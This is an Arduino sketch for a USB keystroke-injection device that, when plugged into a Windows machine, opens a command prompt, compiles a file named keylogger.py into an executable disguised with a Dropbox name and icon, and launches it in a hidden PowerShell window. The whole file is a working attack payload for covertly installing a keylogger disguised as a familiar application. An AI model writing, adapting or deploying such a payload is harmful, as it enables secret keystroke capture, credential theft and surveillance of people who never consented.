#include <Mouse.h>
#include <Keyboard.h>

// Utility function to type a key
void typeKey(int key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup() {
  // Button Code to Disable executing
  pinMode(3, INPUT_PULLUP);
  if (digitalRead(3) == LOW) {
    while (1); // Halt execution if the button is pressed
  }

  // Start Keyboard and Mouse
  Mouse.begin();
  Keyboard.begin();

  // Start Payload
  delay(3000);

  // Open Run dialog
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r'); // Simulates Win + R
  Keyboard.releaseAll();

  delay(500);

  // Open Command Prompt
  Keyboard.print("cmd");
  delay(500);
  typeKey(KEY_RETURN);
  
  delay(2000); // Wait for the Command Prompt to open

  // Change directory and run PyInstaller command
  Keyboard.print("cd Desktop\\Dropbox");
  typeKey(KEY_RETURN);
  delay(500); // Wait for the command to execute
  
  Keyboard.print("pyinstaller --onefile --icon=Dropbox.ico --name=Dropbox keylogger.py");
  typeKey(KEY_RETURN);

  // Wait for 20 seconds for PyInstaller to finish
  delay(20000);

  // Start the executable in hidden mode using PowerShell
  Keyboard.print("powershell -WindowStyle Hidden -Command \"& '%USERPROFILE%\\Desktop\\Dropbox\\dist\\Dropbox.exe'\"");
  typeKey(KEY_RETURN);

  // Stop Keyboard and Mouse
  Keyboard.end();
  Mouse.end();
}

// Unused
void loop() {}
